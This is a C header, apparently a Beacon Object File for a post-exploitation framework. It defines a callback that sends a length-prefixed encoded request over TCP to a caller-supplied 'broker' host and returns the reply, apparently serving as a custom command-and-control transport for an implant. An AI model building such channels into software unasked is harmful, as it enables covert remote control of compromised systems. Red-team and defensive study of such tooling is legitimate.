#pragma once

#include <winsock2.h>
#include <windows.h>

#ifndef KERNEL32$GetProcessHeap
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
#endif
#ifndef KERNEL32$HeapAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
#endif
#ifndef KERNEL32$HeapFree
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
#endif
#ifndef MSVCRT$printf
DECLSPEC_IMPORT int MSVCRT$printf(const char *format, ...);
#endif
#ifndef MSVCRT$strlen
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
#endif
#ifndef WS2_32$WSAStartup
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
#endif
#ifndef WS2_32$socket
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
#endif
#ifndef WS2_32$connect
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
#endif
#ifndef WS2_32$send
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char *, int, int);
#endif
#ifndef WS2_32$recv
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char *, int, int);
#endif
#ifndef WS2_32$closesocket
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
#endif
#ifndef WS2_32$WSACleanup
DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup();
#endif
#ifndef WS2_32$htons
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short);
#endif
#ifndef WS2_32$inet_addr
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char *cp);
#endif

static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    if (host == NULL || host[0] == '\0') {
        MSVCRT$printf("[customCallback] missing host for broker connection\n");
        return NULL;
    }

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int result = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        MSVCRT$printf("[customCallback] WSAStartup failed: %d\n", result);
        return NULL;
    }

    sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        MSVCRT$printf("[customCallback] socket creation failed\n");
        WS2_32$WSACleanup();
        return NULL;
    }

    struct sockaddr_in brokerAddr;
    brokerAddr.sin_family = AF_INET;
    brokerAddr.sin_port   = WS2_32$htons(port);
    brokerAddr.sin_addr.S_un.S_addr = WS2_32$inet_addr(host);

    if (WS2_32$connect(sock, (SOCKADDR *)&brokerAddr, sizeof(brokerAddr)) == SOCKET_ERROR) {
        MSVCRT$printf("[customCallback] failed to connect to broker %s:%u\n", host, (unsigned int)port);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return NULL;
    }

    DWORD bytesToSend = reqLen;
    if (WS2_32$send(sock, (const char *)&bytesToSend, sizeof(bytesToSend), 0) != sizeof(bytesToSend)) {
        MSVCRT$printf("[customCallback] failed to send request length\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return NULL;
    }

    DWORD totalSent = 0;
    while (totalSent < reqLen) {
        int sent = WS2_32$send(sock, encodedRequest + totalSent, (int)(reqLen - totalSent), 0);
        if (sent == SOCKET_ERROR || sent == 0) {
            MSVCRT$printf("[customCallback] failed while sending request body\n");
            WS2_32$closesocket(sock);
            WS2_32$WSACleanup();
            return NULL;
        }
        totalSent += (DWORD)sent;
    }

    DWORD responseLen = 0;
    int received = WS2_32$recv(sock, (char *)&responseLen, sizeof(responseLen), MSG_WAITALL);
    if (received != sizeof(responseLen) || responseLen == 0) {
        MSVCRT$printf("[customCallback] failed to receive response length\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return NULL;
    }

    char *responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, responseLen + 1);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return NULL;
    }

    DWORD totalReceived = 0;
    while (totalReceived < responseLen) {
        int chunk = WS2_32$recv(sock, responseBuf + totalReceived, (int)(responseLen - totalReceived), 0);
        if (chunk == SOCKET_ERROR || chunk == 0) {
            MSVCRT$printf("[customCallback] failed while receiving response body\n");
            KERNEL32$HeapFree(hHeap, 0, responseBuf);
            WS2_32$closesocket(sock);
            WS2_32$WSACleanup();
            return NULL;
        }
        totalReceived += (DWORD)chunk;
    }

    responseBuf[responseLen] = '\0';
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();

    MSVCRT$printf("[customCallback] received %lu bytes from TCP broker\n", (unsigned long)responseLen);
    return responseBuf;
}
